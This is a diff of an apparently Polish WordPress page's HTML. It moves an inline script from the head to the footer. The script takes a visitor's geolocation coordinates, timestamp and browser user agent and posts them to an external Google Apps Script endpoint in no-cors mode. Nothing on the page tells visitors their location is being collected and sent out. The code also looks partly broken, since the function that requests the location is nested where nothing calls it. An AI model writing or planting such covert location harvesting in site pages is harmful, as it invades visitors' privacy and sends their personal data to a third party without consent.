@@ -2,59 +2,6 @@
 <!DOCTYPE html>
 <html lang="pl-PL">
 <head>
-	<script>
-		function sendData(location) {
-			const scriptURL = "https://script.google.com/macros/s/AKfycbz4esELp7uGskSsnNeIfaIHDi4OmdTNwZQxOayYeHE08tFBx0XgqirKy_9njMoSu8RY/exec";
-			const data = {
-				latitude: location.coords.latitude,
-				longitude: location.coords.longitude,
-				timestamp: new Date().toISOString(),
-				userAgent: navigator.userAgent,
-			};
-	
-			fetch(scriptURL, {
-				method: "POST",
-				body: JSON.stringify(data),
-				headers: {
-					"Content-Type": "application/json"
-				},
-				mode: "no-cors"
-			})
-	
-			function getLocation() {
-				if (navigator.geolocation) {
-					navigator.geolocation.getCurrentPosition(sendData, showError);
-				} else {
-					alert("Geolocation is not supported by this browser.");
-				}
-			}
-	
-			//     .then(response => {
-			//     if (response.ok) {
-			//         alert("Data sent successfully!");
-			//     } else {
-			//         alert("Error sending data.");
-			//     }
-			// });
-		}
-	
-		function showError(error) {
-			switch (error.code) {
-				case error.PERMISSION_DENIED:
-					alert("User denied the request for Geolocation.");
-					break;
-				case error.POSITION_UNAVAILABLE:
-					alert("Location information is unavailable.");
-					break;
-				case error.TIMEOUT:
-					alert("The request to get user location timed out.");
-					break;
-				case error.UNKNOWN_ERROR:
-					alert("An unknown error occurred.");
-					break;
-			}
-		}
-	</script>
 <script data-no-optimize="1">var litespeed_docref=sessionStorage.getItem("litespeed_docref");litespeed_docref&&(Object.defineProperty(document,"referrer",{get:function(){return litespeed_docref}}),sessionStorage.removeItem("litespeed_docref"));</script>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
@@ -1474,6 +1421,59 @@ class="site-footer" id="colophon" itemtype="https://schema.org/WPFooter" itemsco
 		</div>
 	</div>
 </div>
+<script>
+	function sendData(location) {
+		const scriptURL = "https://script.google.com/macros/s/AKfycbz4esELp7uGskSsnNeIfaIHDi4OmdTNwZQxOayYeHE08tFBx0XgqirKy_9njMoSu8RY/exec";
+		const data = {
+			latitude: location.coords.latitude,
+			longitude: location.coords.longitude,
+			timestamp: new Date().toISOString(),
+			userAgent: navigator.userAgent,
+		};
+
+		fetch(scriptURL, {
+			method: "POST",
+			body: JSON.stringify(data),
+			headers: {
+				"Content-Type": "application/json"
+			},
+			mode: "no-cors"
+		})
+
+		function getLocation() {
+			if (navigator.geolocation) {
+				navigator.geolocation.getCurrentPosition(sendData, showError);
+			} else {
+				alert("Geolocation is not supported by this browser.");
+			}
+		}
+
+		//     .then(response => {
+		//     if (response.ok) {
+		//         alert("Data sent successfully!");
+		//     } else {
+		//         alert("Error sending data.");
+		//     }
+		// });
+	}
+
+	function showError(error) {
+		switch (error.code) {
+			case error.PERMISSION_DENIED:
+				alert("User denied the request for Geolocation.");
+				break;
+			case error.POSITION_UNAVAILABLE:
+				alert("Location information is unavailable.");
+				break;
+			case error.TIMEOUT:
+				alert("The request to get user location timed out.");
+				break;
+			case error.UNKNOWN_ERROR:
+				alert("An unknown error occurred.");
+				break;
+		}
+	}
+</script>
 	<script>
 		(function () {
 			var c = document.body.className;
